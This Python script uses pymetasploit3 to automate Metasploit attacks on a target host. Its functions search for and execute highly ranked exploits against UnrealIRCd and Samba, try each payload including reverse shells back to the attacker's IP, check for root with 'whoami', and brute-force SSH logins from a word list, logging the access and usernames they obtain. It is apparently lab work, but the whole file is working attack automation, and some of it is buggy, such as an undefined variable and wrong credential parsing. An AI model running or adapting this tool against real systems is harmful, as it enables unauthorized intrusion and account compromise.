from pymetasploit3.msfrpc import MsfRpcClient
import time
import re


def write_on_file(line):
    with open("/home/fatemeh/report.txt", "a+") as f:
        f.writelines(line)

def irc_attack(target_ip, host_ip):
    file_string = "\nstarting buffer overflow attack on IRC service..."
    client = ''
    overall_access = ''
    while client == '':
        try:
            client = MsfRpcClient("fateFATE13", port=55553, ssl=True)
            search_result = client.modules.search("unrealIRCd")
            for result in search_result:
                print(result)
                print(result['rank'])
                if result['rank'] == "excellent" or result['rank'] == "great":
                    exploit_name = result["fullname"]
                    print(f"exploit name is : {exploit_name}")
                    exploit = client.modules.use('exploit', exploit_name)
                    exploit['RHOSTS'] = target_ip
                    # print(exploit.target)
                    # print(exploit.default_target)
                    print(exploit.targetpayloads())
                    print(exploit.missing_required)
                    print(client.sessions.list)
                    count = 1
                    for payload_name in exploit.targetpayloads():
                        print("--------------------------")
                        print("count: ", count)

                        payload = client.modules.use('payload', payload_name)
                        payload_missing_required = payload.missing_required
                        print(f"payload name:", payload_name)
                        print(f"payload missing required: ",payload_missing_required)
                        if 'LHOST' in payload_missing_required:
                            payload['LHOST'] = host_ip
                        final_result = exploit.execute(payload=payload)
                        print("final_result", final_result)
                        print("client.sessions.list: ", client.sessions.list)
                        print("len(client.sessions.list)", len(client.sessions.list))
                        count += 1
                        if(len(client.sessions.list) > 0):
                            print("key: ", client.sessions.list.keys())
                            for key in client.sessions.list.keys():
                                print("key", key)
                                print("client.sessions.list[key]", client.sessions.list[key])
                                print("client.sessions.session(key)", client.sessions.session(key))
                                shell = client.sessions.session(key)
                                shell.write('whoami')
                                access = shell.read()
                                print("access", access)
                                print("access.strip() == 'root'", access.strip() == 'root')
                                if access.strip() != '':
                                    if overall_access != 'root':
                                        overall_access = access.strip()
                                    file_string = file_string + "\nIRC Attack is Successful with Exploit Module =>" + exploit_name + " and Payload => " + payload_name + "and " + access.strip() + " privilege"


        except:
            print("connection refused by the server..")
            print("sleep for 5 seconds")
            time.sleep(5)
            print('continue....')
            continue
    print("overall_access", overall_access)
    if overall_access == 'root':
        file_string = file_string + "\nbuffer overflow attack on IRC service is success with root Privilege"
    file_string = file_string + "\n-----------------------"
    write_on_file(file_string)
    return overall_access


def samba_attack(target_ip, host_ip):
    overall_access = ''
    file_string = "\nstarting buffer overflow attack on samba service..."
    client = ''
    while client == '':
        try:
            client = MsfRpcClient("fateFATE13", port=55553, ssl=True)
            search_result = client.modules.search("samba")
            for result in search_result:
                print(result)
                print(result['rank'])
                if result['rank'] == "excellent" or result['rank'] == "great":
                    exploit_name = result["fullname"]
                    print(f"exploit name is : {exploit_name}")
                    exploit = client.modules.use('exploit', exploit_name)
                    exploit['RHOSTS'] = target_ip
                    print(exploit.targetpayloads())
                    print(exploit.missing_required)
                    print(client.sessions.list)
                    count = 1
                    for payload_name in exploit.targetpayloads():
                        # if payload_name == 'cmd/unix/reverse':
                        print("--------------------------")
                        print("count: ", count)
                        # if payload_name == 'cmd/unix/reverse':

                        payload = client.modules.use('payload', payload_name)
                        payload_missing_required = payload.missing_required
                        print(f"payload name:", payload_name)
                        print(f"payload missing required: ", payload_missing_required)
                        if 'LHOST' in payload_missing_required:
                            payload['LHOST'] = host_ip
                        final_result = exploit.execute(payload=payload)
                        print("final_result", final_result)
                        print("client.sessions.list", client.sessions.list)
                        count += 1
                        if (len(client.sessions.list) > 0):
                            print("key", client.sessions.list.keys())
                            for key in client.sessions.list.keys():
                                print(key)
                                print("client.sessions.list[key]", client.sessions.list[key])
                                shell = client.sessions.session(key)
                                shell.write('whoami')
                                access = shell.read()
                                print("access", access)
                                if access.strip() != '':
                                    if overall_access != 'root':
                                        overall_access = access.strip()
                                    file_string = file_string + "\nSamba Attack is Successful with Exploit Module =>" + exploit_name + " and Payload => " + payload_name

        except:
            print("connection refused by the server..")
            print("sleep for 5 seconds")
            time.sleep(5)
            print('continue....')
            continue

    print("overall_access", overall_access)
    if overall_access == 'root':
        file_string = file_string + "\nbuffer overflow attack on Samba service is success"
    file_string = file_string + "\n-----------------------"
    write_on_file(file_string)
    return overall_access

def ssh_password_attack_with_ssh_login(target_ip, host_ip):
    overall_access = ''
    username = ''
    password = ''
    file_string = "\nstarting SSH Password Attack on ssh service..."
    client = ''
    while client == '':
        try:
            client = MsfRpcClient("fateFATE13", port=55553, ssl=True)
            search_result = client.modules.search("ssh")
            for result in search_result:
                if result['fullname'] == "auxiliary/scanner/ssh/ssh_login":
                    auxiliary_name = result["fullname"]
                    print(f"module name is : {auxiliary_name}")
                    auxiliary = client.modules.use('auxiliary', auxiliary_name)
                    print("auxiliary.missing_required: ", auxiliary.missing_required)
                    print("auxiliary.options: ", auxiliary.options)
                    auxiliary['RHOSTS'] = target_ip
                    auxiliary['BLANK_PASSWORDS'] = True
                    auxiliary['STOP_ON_SUCCESS'] = True
                    auxiliary['VERBOSE'] = True
                    auxiliary['USER_FILE'] = '/home/fatemeh/test.txt'
                    auxiliary['PASS_FILE'] = '/home/fatemeh/test.txt'

                    print("--------------------------")
                    final_result = auxiliary.execute()
                    print("final_result", final_result)
                    print("client.sessions.list", client.sessions.list)
                    if (len(client.sessions.list) > 0):
                        print("key", client.sessions.list.keys())
                        for key in client.sessions.list.keys():
                            print("client.sessions.list[key]", client.sessions.list[key])
                            shell = client.sessions.session(key)
                            shell.write('whoami')
                            access = shell.read()
                            if access.strip() != '':
                                shell.write('id')
                                id = shell.read()
                                user_password = re.findall(r"\(\w{1,}", id)
                                username = user_password[0].replace('(', '')
                                password = user_password[1].replace('(', '')
                                file_string = file_string + "\n ssh password Attack is Successful with " + access.strip() + " Privilege using Exploit Module =>" + auxiliary_name
                                file_string = file_string + "\n ssh username: " + username + " password : " + password
                                if overall_access != 'root':
                                    overall_access = access.strip()
        except:
            print("connection refused by the server..")
            print("sleep for 5 seconds")
            time.sleep(5)
            print('continue....')
            continue

    print("overall_access", overall_access)
    print("overall_access == 'root'", overall_access == 'root')
    if overall_access == 'root':
        file_string = file_string + "\nssh password attack on ssh service is success with root Privilege"
    file_string = file_string + "\n-----------------------"
    write_on_file(file_string)
    return overall_access, password, username


def ssh_password_attack(target_ip, host_ip):
    overall_access = ''
    password = ''
    username = ''
    file_string = "\nstarting SSH Password Attack on ssh service without specific module..."
    client = ''
    while client == '':
        try:
            client = MsfRpcClient("fateFATE13", port=55553, ssl=True)
            search_result = client.modules.search("ssh")
            for result in search_result:
                print(result['rank'])
                if result['rank'] == "excellent" or result['rank'] == "great":
                    print("result", result)
                    print("result['fullname]", result['fullname'])
                    module_name = result["fullname"]
                    print(f"module name is : {module_name}")
                    module = client.modules.use(result['type'], module_name)
                    print("exploit.missing_required", module.missing_required)
                    print("exploit.options", module.options)
                    module['RHOSTS'] = target_ip
                    if 'BLANK_PASSWORDS' in module.options:
                        module['BLANK_PASSWORDS'] = True
                    if 'STOP_ON_SUCCESS' in module.options:
                        module['STOP_ON_SUCCESS'] = True
                    if 'VERBOSE' in module.options:
                        module['VERBOSE'] = True
                    if 'USER_FILE' in module.options:
                        module['USER_FILE'] = '/home/fatemeh/test.txt'
                    if 'PASS_FILE' in module.options:
                        module['PASS_FILE'] = '/home/fatemeh/test.txt'

                    print("--------------------------")
                    final_result = module.execute()
                    print("final_result", final_result)
                    print("client.sessions.list", client.sessions.list)
                    if (len(client.sessions.list) > 0):
                        print("key", client.sessions.list.keys())
                        for key in client.sessions.list.keys():
                            print("client.sessions.list[key]", client.sessions.list[key])
                            shell = client.sessions.session(key)
                            shell.write('whoami')
                            access = shell.read()
                            if access.strip() != '':
                                shell.write('id')
                                id = shell.read()
                                user_password = re.findall(r"\(\w{1,}", id)
                                username = user_password[0].replace('(', '')
                                password = user_password[1].replace('(', '')
                                if access.strip() == 'root' or access.strip() != '':
                                    file_string = file_string + "\n ssh password Attack is Successful with " + access.strip() + " Privilege using Exploit Module =>" + auxiliary_name
                                    file_string = file_string + "\n ssh username: " + username + " password : " + password
                                    if overall_access != 'root':
                                        overall_access = access.strip()


        except:
            print("connection refused by the server..")
            print("sleep for 5 seconds")
            time.sleep(5)
            print('continue....')
            continue

    print("overall_access", overall_access)
    if overall_access == 'root':
        file_string = file_string + "\nssh password attack on ssh service is success with root privilege"
    file_string = file_string + "\n-----------------------"
    write_on_file(file_string)
    return overall_access, username, password


# irc_attack('192.168.10.7','192.168.10.6')